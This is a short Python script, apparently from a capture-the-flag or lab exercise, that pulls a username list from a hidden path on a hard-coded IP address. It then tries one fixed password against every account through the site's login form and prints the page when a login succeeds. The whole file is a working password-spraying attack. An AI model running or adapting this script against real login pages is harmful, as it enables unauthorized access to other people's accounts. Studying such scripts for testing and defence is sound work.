#!/usr/bin/env python3
import requests

url = 'http://159.203.191.48'
password = 'Spring2023!!!'

s = requests.Session()

r = s.get(url+'/.username/.usernames.txt')
usernames = r.text.splitlines()

for username in usernames:
    data = {
        "username": username.strip(),
        "password": password,
        "submit": "Login"
    }

    r = s.post(url, data=data)
    print('Testing', username)
    if "Invalid login" not in r.text:
        print(r.text)
        exit(0)
